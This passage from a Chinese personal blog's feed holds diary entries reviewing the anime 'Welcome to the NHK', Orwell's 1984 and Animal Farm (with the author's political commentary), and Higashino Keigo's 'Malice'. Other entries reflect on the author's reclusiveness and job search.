title="角色"></a>角色</h1><p>本部作品中的角色都很有趣。</p><p><strong>男主（佐藤达广）</strong><br>首先这是个真废物，恶心人的品质有不少。<br>比如：下载色图到电脑磁盘塞满，天天打游戏不分昼夜，对不切实际的幻想想入非非，傻到被传销组织连骗两次…<br>如果只有其中的一两点倒还好，他是各样均沾，让我对这位男主都有点反感了。<br>不过，这个人也不是一无是处，他拒绝了对学姐外遇的邀约，舍身拯救了女主。</p><p><strong>女主（中原岬）</strong><br>简直像女神&#x2F;天使一样。<br>当然，并不是说女主是完美无缺的人。实际上，就精神状态而言，女主只比男主好上一些罢了。女主是18岁高中辍学的中原岬。<br>之所以，要帮助男主摆脱家里蹲状态，也是为了能够证明自己并非一无是处。</p><p><strong>女二（柏瞳）</strong><br>是个坏女人呢。<br>男主的高中学姐，可谓是男主的负面源头之一。拉上男主去组团跳海自杀，诱惑男主外遇…<br>但不得不说，学姐也正因为她的坏，有了别具一格的魅力。<br>这种魅力让男主为她一起自杀事后却毫无怨言。</p><p><strong>男二（山崎薰）</strong><br>不甘平凡却又归于平凡。<br>可以说在他的圈子里是个“怪胎”。不屑与对随波逐流的人为伍，抛弃继承家业来到东京逐梦游戏制作。<br>他是个有决心有毅力的人。因为拒绝一眼望得到头的人生自行选择了更艰苦却热爱的事业。最终由于家庭因素放弃了梦想，安然接受一眼到头的人生。<br>其实我内心与这个角色有些共鸣，我也是拒绝一眼到头的人生，可是否过10年或20年之后，又会像他一样安然接受了呢？<br>要说没有一点这种恐惧，那是自欺欺人。</p><p><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_4.png" alt=" "></p><h1 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h1><p>就我看来，这部动画本质上讲的是<strong>对现实的释然</strong>。</p><p>把男主这个社会底层作为主要观察对象，来表现一些人的生存方式，最终对现实的释然。<br>生存方式里，男主是逃避，男二是逐梦，女主是自我欺骗，女二是隐忍与发泄。</p><p>男主自从不去大学后，对外界的眼光越发在意到难以与陌生人打交道的地步。<br>结果就是成天在租的屋子里不去工作依靠父母救济。<br>他知道应该如何解决问题，那就是去找一份工作。但因为仍旧有着退路（指父母的接济），所以迟迟没有付诸行动。<br>最终父母把他的生活费断掉之后，他饿了三天最终去找了一份工作。<br>他逃避着一切：逃避世人眼光成了无业游民，逃避承认自己是家里蹲而选择做美少女游戏，逃避被母亲看到不堪一面而制造谎言，逃避现实而喜欢上了游戏中的虚拟人物，逃避正确的路而被传销组织二度欺骗…<br>我们可以看到，逃避最终没有效果，是因生存的环境消失而自己又有着生存欲望而被迫正视现实。<br>曾经看到某个电视剧的名称叫做“逃避虽然可耻但是有用”，我对这个名称嗤之以鼻。<br>我曾经也逃避过，我不喜欢麻烦事，所以为了逃避麻烦事，一直想办法往后拖。<br>然而这没有意义，最终反而给我造成了不得不面对的更大麻烦。<br>经历了那样的教训后，我从此明白逃避，是一条不可选择的路。或者说，长期逃避而不去解决，是绝对不能做的，否则最终只有死路一条。</p><p><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_7.png" alt=" "></p><p>归根结底，所有人不都是对现实不满，才会做出不合常理的举动吗？<br>症状轻的人，即使不满也会去努力改变；症状重的人，直接放弃了生存的欲望。<br>男二对现实不满于是去改造，他失败了，接受了，释然了。别离东京的最后，用一种自我毁灭的方式辞别了他喜欢的女生。<br>女二对现实放弃了希望，于是组团跳海自杀，虽然挽回了，但是她生活里的不满并没有消失，她仍然感到压力大与心累。她是物质上的成功人士：是公务员，有着正常的丈夫，住着豪宅。可她的精神很糟糕，遭受职场中人的排斥，对象常常因为工作繁忙而不能陪她，吃着精神方面的药物。想通过搞外遇来缓解这种压力，幸而男主没有接受。<br>男主对现实不满，他是边逃避边改造，一来不想与外界接触，二来又不甘于成为家里蹲。在这种矛盾的心理下，才会有时好像进步了有时又在退步。<br>女主对现实一开始没有放弃希望，他拯救男主，想以此来证明自己的价值，并且想通过这种方式来让男主依赖自己，好让自己不寂寞。然而男主成功走出家里蹲后，没有依赖女主，他也不认为这是一种健康的生存方式。结果导致了女主的绝望，让女主走向自杀。但幸好最终男女主互相释然了，接受了这样的现实。</p><p>他们没有改造现实的能力，只是对现实释然了。</p><p><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_1.png" alt=" "><br><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_5.png" alt=" "><br><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_9.png" alt=" "></p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_10.png&quot; alt=&quot;中原岬&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="动画" scheme="http://example.com/categories/%E5%8A%A8%E7%94%BB/"/>
-    
-    
-    <category term="动画" scheme="http://example.com/tags/%E5%8A%A8%E7%94%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一九八四</title>
-    <link href="http://example.com/2023/08/10/Diary_20230810/"/>
-    <id>http://example.com/2023/08/10/Diary_20230810/</id>
-    <published>2023-08-09T16:00:00.000Z</published>
-    <updated>2023-08-10T17:14:00.848Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又看完了一本书。</p><span id="more"></span><h1 id="一九八四"><a href="#一九八四" class="headerlink" title="一九八四"></a>一九八四</h1><p>今天看完了《一九八四》这本书，分了3天看完的，今天看的是主人公最痛苦的一段，但却是我看的最快的一段。<br>从主人公怀有对未来的憧憬，到面如死灰。也只是过了一个月。</p><p>对比乔治奥威尔的《动物农场》，这本更加复杂也更加恐怖。不同的是，动物农场描绘的画卷是逐渐演变为腐败的过程。而一九八四描绘的画卷是已然成形了的终极形态。一切都处于压抑之中。</p><p>有点晚了，不太想写什么了，放点本书名言吧。</p><h1 id="名言"><a href="#名言" class="headerlink" title="名言"></a>名言</h1><p>老大哥在看着你。</p><p>战争即和平<br>自由即奴役<br>无知即力量</p><p>所谓自由就是可以说二加二等于四的自由。</p><h1 id="有感触的文字"><a href="#有感触的文字" class="headerlink" title="有感触的文字"></a>有感触的文字</h1><p>这也不无理由，因为每星期《泰晤士报》总有一条消息报道有个偷听父母讲话的小密探——一般都称为“小英雄”——偷听到父母的一些见不得人的话，向思想警察作了揭发。</p><p>思想罪不会带来死亡：思想罪本身就是死亡。</p><p>如果党能够插手到过去之中，说这件事或那件事从来没有发生过(it never happened)，那么这肯定比仅仅拷打或者死亡更加可怕。</p><p>如果别人都相信党说的谎话——如果所有记录都这么说——那么这个谎言就载入历史而成为真理。</p><p>群众从来不会自动起来造反，他们从来不会由于身受压迫而起来造反。说真的，只要不给他们比较的标淮，他们从来不会意识到自己受压迫。</p><p>如果他认为(thinks)他已离地飘浮起来，如果我同时认为(think)我看到他离地飘浮起来，那么这件事就真的发生了。</p><p>他鼻梁两侧流下了带着酒气的泪。但是没有事，一切都很好，斗争已经结束了。他战胜了自己。他热爱老大哥。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不要觉得这样的情节离现实很远。</p><p>一个小例子：老舍在美国读完这本书，认为这种情节很荒谬，然而17年后因为文化大革命投湖自杀。</p><p>不去抗争，悲哀终临其身。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;又看完了一本书。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>宅</title>
-    <link href="http://example.com/2023/08/09/Diary_20230809/"/>
-    <id>http://example.com/2023/08/09/Diary_20230809/</id>
-    <published>2023-08-08T16:00:00.000Z</published>
-    <updated>2023-08-09T17:29:32.685Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>hvv开始了，没有参加，从旁看热热闹闹轰轰烈烈。</p><span id="more"></span><h1 id="宅"><a href="#宅" class="headerlink" title="宅"></a>宅</h1><p>说起来，我现在应该算是一种宅形态了。</p><p>为什么会变成这样呢？<br>这让我有些纳闷儿。</p><p>2年前我大概还不是这样，每天早上有跑步，会与人露营或旅游，也会与朋友偶尔在城市里看看电影，探索一些新开餐厅之类的。<br>完全是一副积极健康向上的模样。</p><p>现在的我呢？一想到跑步就感觉浑身沾满了汗水，有人邀请旅游会拒绝，也不邀请别人出去玩。</p><p>完全变成了一座孤岛。</p><p>我想，这不是一种好迹象，还是来分析一下原因吧。</p><ol><li>每天睡得晚，导致难以早起跑步。</li><li>惰性与惯性混合，越懒越不想动，越不想动越懒。</li><li>对人的交际不重视，没有想和别人一起做什么的欲望。</li><li>消极负面思想，总是抱持着虚无的念头，对事物没什么期望。（根本原因）</li></ol><p>大概就是这样。</p><p>解决方法的话，巩固亲朋好友的关系，交新朋友也许能改善不少。（但是一想到这些马上就有消极的念头冒出来了，简直无可救药&#x2F;(ㄒoㄒ)&#x2F;）</p><p>再这么下去，迟早会被负面给吞噬的…</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;hvv开始了，没有参加，从旁看热热闹闹轰轰烈烈。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>奈落</title>
-    <link href="http://example.com/2023/08/07/Diary_20230807/"/>
-    <id>http://example.com/2023/08/07/Diary_20230807/</id>
-    <published>2023-08-06T16:00:00.000Z</published>
-    <updated>2023-08-07T14:56:56.133Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有时人真的脆弱。</p><span id="more"></span><h1 id="人"><a href="#人" class="headerlink" title="人"></a>人</h1><p>有时人脆弱有时人坚强，契机往往无心。</p><h1 id="我"><a href="#我" class="headerlink" title="我"></a>我</h1><p>今天有几个人问我找工作了吗，我说没有。<br>一开始想的是在家短暂逗留便回成都找工作，实际我懒惰地什么也没做。<br>我必须诚实地面对自己，别让欺骗自己的谎言沉醉，也别披上光鲜亮丽的外皮造成错觉。</p><h1 id="期限"><a href="#期限" class="headerlink" title="期限"></a>期限</h1><p>我得给自己一个期限，不能无休止地这么下去。想了想，最迟12号之前，我会将大部分时间用于学习，准备面试。完成后，去成都找工作。</p><p>突然想起来，之前有人问我：你不是应该去体制内工作的吗？<br>不知道为何这么说，可能是我进体制比较容易吧。<br>然而我并没有那种意愿，我可能懒惰，也不意味着我想去进体制做那种混时间的事务。<br>有得有失，懒惰却又不愿浪费时间。</p><p>真是个别扭的人啊。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;有时人真的脆弱。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>动物农场</title>
-    <link href="http://example.com/2023/08/06/Diary_20230806/"/>
-    <id>http://example.com/2023/08/06/Diary_20230806/</id>
-    <published>2023-08-05T16:00:00.000Z</published>
-    <updated>2023-08-06T17:48:25.344Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>雨很密，夜还长。</p><span id="more"></span><h1 id="看的书"><a href="#看的书" class="headerlink" title="看的书"></a>看的书</h1><p>今天看完了这本乔治·奥威尔的《动物农场》。<br>一部不长的小说，百来页。<br>不过我倒是看了挺长时间，主要是看到后半段既视感太强了。</p><p>这是一部政治讽刺性小说，大概也算是我看的第一部此类题材的小说。政治敏感嘛，这种小说放到现在也不会出版。<br>乔治·奥威尔就是凭借《动物农场》和《1984》获得了久远的名声。《1984》也是我下一本打算拜读的小说。</p><p>动物农场 咋一看是部童话，实则不然。看完书后某些评论说，如果不是知道乔治奥威尔逝世于1950年，还以为是在讽刺中国呢。我也深有同感。<br>里面的动物都有着象征意味，但即使让小孩子看倒也未尝不可。</p><h1 id="动物农场"><a href="#动物农场" class="headerlink" title="动物农场"></a>动物农场</h1><p>那么下面来谈谈这部小说吧。我不打算写概述。不过本书写作的背景倒是值得一提：奥威尔为了唤醒西方民众对苏联神话而写的。这也解释了为什么战后有大量的国家效仿苏联建立了社会主义，他们没有看清苏联所谓社会主义的真面目。</p><p>里面的动物各有各的象征：猪象征极权统治者，狗象征暴力机关，羊象征宣传机构或小粉红之流，马和鸡象征民众，驴象征清醒旁观的知识分子，乌鸦象征宗教。</p><p>看到后半段后，既视感太强，几乎每隔几页就要在书上做个批注。举几个例子：</p><p><font color=grey>“同志们！”吱嘎大声说，一边做着神经质的小幅动作跳来跳去，“一件最可怕的事情已被发现。雪球把自己出卖给了撬棍地农场的弗雷德里克，此人至今还在阴谋策划袭击我们，妄图把我们的农场从我们手里夺走！一旦袭击发动起来，将由雪球充当他的向导。但是还有比这更糟的。我们原以为雪球造反的起因仅仅在于他的虚荣心重，狂妄自大。但是我们错了，同志们。你们可知道真正的原因是什么？雪球从一开始就和琼斯穿的是连裆裤！他一直是琼斯的暗藏特务。这一切从他没能带走而且刚刚被我们发现的文件中得到了证实。这些文件在我看来能说明很多问题。他是如何企图使我们在牛棚战役中被打败和被消灭的，难道我们自己未曾看见？幸亏他没有得逞。”</font><br><font color=orange>太讽刺了。没有敌人，就制造敌人。转移内部矛盾，混淆视听。“一旦发生了什么坏事，都是美国&#x2F;日本的错。”</font></p><p><font color=grey>他转身要走，又顿了一下，意味深长地找补几句：“我奉劝这座农场的每一只动物一定得把眼睛睁大。因为我们有理由认为，雪球的某些暗藏特务此刻正潜伏在我们中间。”</font><br><font color=orange>制造矛盾，分化民众，让他们惶惶不安。“所谓的举报间谍50万。”</font></p><p><font color=grey>星期天上午，吱嘎总要用蹄子夹着长长一条纸，向动物们宣读大串大串的数字，表明各档粮食的产量分别增长百分之二百，百分之三百或百分之五百，因不同情况而异。动物们认为没有理由不相信他，何况他们再也记不清造反之前究竟是怎么个状况。反正有些日子他们还是感到，他们宁愿少听些数字，多得到些吃的。</font><br><font color=orange>这些统治者，擅长忽悠，而非实干。民众心声是重点：少听些数字，多得些吃的。“官话：稳中有进…”</font></p><p><font color=grey>农场每次取得什么成绩，好运无论临到谁的头上，都要归功于拿破仑，这已成为惯例。</font><br><font color=orange>功劳不落于具体的实处，而是归于某个无关的个体或团体。“人民取得了什么成就都要感谢党。”</font></p><p><font color=grey>动物们现在也了解到，雪球从来没有像许多群众至今还相信的那样获得过“动物英雄一级勋章”。这纯粹是一个子虚乌有的神话，它是在牛棚战役后不久由雪球自己散播的。这个根本没有被授勋的家伙，曾因在战斗中贪生怕死而受过处分。听了这种说法，某些动物再一次感到有些茫然，但吱嘎很快就能够使他们信服，是他们的记性出了问题。</font><br><font color=orange>篡改历史。通过贬低上一个时代失败的个体&#x2F;团体，来提升胜利者的地位。“某共通过贬低国民党来宣扬自身的伟大。”</font></p><p><font color=grey>不过，当初雪球教动物们梦想过上的奢华生活——有电灯照明和冷热水齐全的厩舍，一周三天工作制——再也不谈了。拿破仑指责这种想法是与动物主义的精神背道而驰的。他说，真真正正的幸福就在于勤奋的工作和俭朴的生活。</font><br><font color=orange>洗脑。要奉献，不要回报。“付费上班，主动加班，恶意讨薪”</font></p><p><font color=grey>然则动物们从不放弃希望。非但如此，他们从来不曾，哪怕只是短短的一瞬间也不曾丧失自己作为动物农场成员之一的荣誉感和优越感。</font><br><font color=orange>愚昧无知。“无论自己过得多差，粉红也会为所谓的大国工程自豪，对其他国家显示自己的优越感。”</font></p><p><font color=red>凡动物一律平等  但是有些动物比别的动物更加平等</font><br><font color=orange>本书经典名言</font></p><h1 id="仇恨日本人"><a href="#仇恨日本人" class="headerlink" title="仇恨日本人"></a>仇恨日本人</h1><p>说起来，我不怎么讨厌日本人。不过大部分中国人大概和我想法不一样吧。大部分中国人讨厌日本人的原因，主要就是日军侵华吧。</p><p>而我突然想到了一个例子，正好可以反驳：</p><p>作为一个中国人，假如一个中国人张三杀了你的家人，你会恨中国人吗？我想绝大多数人的回答都是 不会。<br>因为张三做的事，应该由张三自行承担，而不是中国人整个国家的人承担。</p><p>同理，侵华日军做的事，应该由这些日军承担，而不是落到整个国家的人身上。<br>或许有人会想日本政府如何如何，但是这是一个决策机构做的事，不是全体日本人的意志。正如不会有中国人把政府给黑人开放大量优惠政策当成是自己做的事，不是吗？<br>说到底，大部分中国人会像这样讨厌日本人，不过是由于仇恨教育，加上媒体的煽风点火，还有自己那没点思考能力的脑子合在一起的产物罢了。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>大概，我是动物农场里的一头驴？</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;雨很密，夜还长。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>恶意</title>
-    <link href="http://example.com/2023/08/05/Diary_20230805/"/>
-    <id>http://example.com/2023/08/05/Diary_20230805/</id>
-    <published>2023-08-04T16:00:00.000Z</published>
-    <updated>2023-08-06T08:04:46.301Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>回归到看书了。</p><span id="more"></span><h1 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h1><p>今天看完了东野圭吾的《恶意》。这是好几年前买的书了，一直放着没看，塑封也未曾拆开。<br>那么我看书的缘由是什么呢？其实是昨日看的《心理测量者》这部动漫，动漫里的角色引用了许多名人名言，蛮精彩的。而我却很多都没听过，令我察觉到自身的浅薄，于是便开始看书了。</p><h1 id="恶意"><a href="#恶意" class="headerlink" title="恶意"></a>恶意</h1><p>东野圭吾的书是高中时期开始看的，也不记得开始的由头是什么，只知道有一次看了一本东野圭吾的《流星之绊》，感觉不错。后来又买了本《解忧杂货店》，看了也挺良好，不自觉地开始看起了他的书了。<br>说来这位日本作家其实写了不少书，粗略预计有20本以上，不过我只读过5，6本。心想挑着最好的来读罢了。<br>还记得推荐给朋友看过，朋友后来看了他的好多书，反过来还向我推荐他的书。</p><p>总的来说，他的书挺好看的。主要以推理小说为主，当然不是本格推理这种。</p><p>这次看的便是一本挺有名气的《恶意》。<br>不过，开篇不久就抓到了犯人，这实属超出了我的预料。因为以前看到的都是临近尾声才抓到。<br>《恶意》的重点并不在于抓到人，而是犯人的动机。<br>我一厢情愿以为会反转，即不是最开始抓到的犯人做的。<br>不过本书的主题倒也显现出来，就是恶意。</p><p>人总是会对他人这样：嫉妒，羡慕之类的情绪。<br>虽然我很少有与他人进行比较，或许是我接触人比较少。但无疑，这些情绪在人类之中是广泛存在的。<br>倘若只是羡慕倒也还好，到了嫉妒的地步，可以说就是恶意的初显了，再在之上的恨，是一种难以挽回的情绪。</p><p>恶意是一种不因人的相互作用而产生的行为。<br>这么说有点拗口，通俗地说便是：一个人未招惹任何人，但却有另一个人看他不爽而希望他不好，甚至付诸行动。这便是恶意。<br>人性中幽暗的成分。无可避免，在广大人群中总会产生。<br>说起来，仇富情绪，也是恶意的一种。</p><p>恶意是人类的负面力量，阻碍人类前进。<br>应当百分百阻止，不能纵容。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;回归到看书了。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
     
   </entry>
   
